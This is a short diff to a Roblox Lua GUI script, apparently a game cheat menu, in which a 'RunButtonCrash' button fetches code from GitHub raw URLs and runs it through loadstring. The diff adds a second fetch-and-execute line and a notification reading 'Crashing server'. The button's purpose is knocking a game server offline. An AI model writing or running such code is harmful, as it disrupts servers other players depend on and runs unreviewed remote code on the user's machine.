@@ -235,6 +235,8 @@ RunButtonCrash.Text = "Run"
 RunButtonCrash.TextColor3 = Color3.fromRGB(255, 255, 255)
 RunButtonCrash.TextSize = 24.000
 RunButtonCrash.MouseButton1Click:connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/plugss/Notifcation/main/Symbaal"))()
+_G.notify('Crashing server',"WeirdFormat")
 	loadstring(game:HttpGet(('https://raw.githubusercontent.com/plugss/ratemyavatar/main/README.md'),true))()
 
 end)
